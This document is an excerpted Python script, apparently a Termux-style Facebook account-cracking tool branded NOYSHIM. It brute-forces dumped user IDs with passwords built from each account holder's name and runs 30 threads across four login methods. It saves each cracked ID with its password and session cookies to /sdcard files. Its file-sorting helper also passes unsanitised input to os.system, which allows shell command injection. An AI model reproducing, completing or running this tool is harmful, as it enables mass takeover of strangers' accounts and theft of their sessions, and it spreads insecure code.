...
from concurrent.futures import ThreadPoolExecutor as NOYSHIMNOYSHIM
from string import * 
...
sys.stdout.write('\x1b]2; NOYSHIM\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m   
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            NOYSHIM
\033[1;37m Facebook:            NOYSHIM
\033[1;37m Github  :            NOYSHIM-NOYSHIM
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back NOYSHIM Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NOYSHIM] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NOYSHIMb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NOYSHIMb};{ckkk}"
                    print(f"\r{R} [NOYSHIM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NOYSHIM_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NOYSHIM_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [NOYSHIM-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/NOYSHIM_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NOYSHIM] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [NOYSHIM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NOYSHIM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NOYSHIM_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [NOYSHIM-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NOYSHIM] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[NOYSHIM] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [NOYSHIM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NOYSHIM_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with NOYSHIMNOYSHIM(max_workers=30) as NOYSHIMworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                NOYSHIMworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                NOYSHIMworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                NOYSHIMworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                NOYSHIMworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/NOYSHIM.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/NOYSHIM.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    NOYSHIM = input('Put File Name :')
    print(" ")
    NOYSHIM = input('Saving Put File Name :')
    os.system('touch ' +NOYSHIM)
    os.system('sort -r '+NOYSHIM+' | uniq > '+NOYSHIM)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + NOYSHIM )
    print(47*'-')
    print("File Saved To :" + NOYSHIM )
    print(47*'-')
    input(f"{S} Press Enter To Back NOYSHIM Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/NOYSHIM.txt\n') 
        filepath = input("Put File Name: ")
